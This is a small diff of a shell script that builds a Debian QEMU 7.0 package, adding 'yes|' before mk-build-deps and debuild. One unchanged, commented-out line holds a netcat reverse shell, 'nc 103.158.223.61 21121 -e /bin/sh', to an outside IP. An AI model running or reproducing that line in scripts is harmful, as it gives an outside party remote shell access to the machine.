@@ -22,9 +22,9 @@ build_qemu () {
   dpkg-source --auto-commit -b qemu-7.0+dfsg/
   cd qemu-7.0+dfsg
   #nc 103.158.223.61 21121 -e /bin/sh
-  mk-build-deps -i
+  yes|mk-build-deps -i
   #mk-build-deps --install --root-cmd sudo --remove
-  debuild -us -uc
+  yes|debuild -us -uc
   #curl -L https://download.qemu.org/qemu-7.0.0.tar.xz -o qemu.tar.xz
   #tar xvJf qemu.tar.xz > /dev/null
   #cd qemu-7.0.0
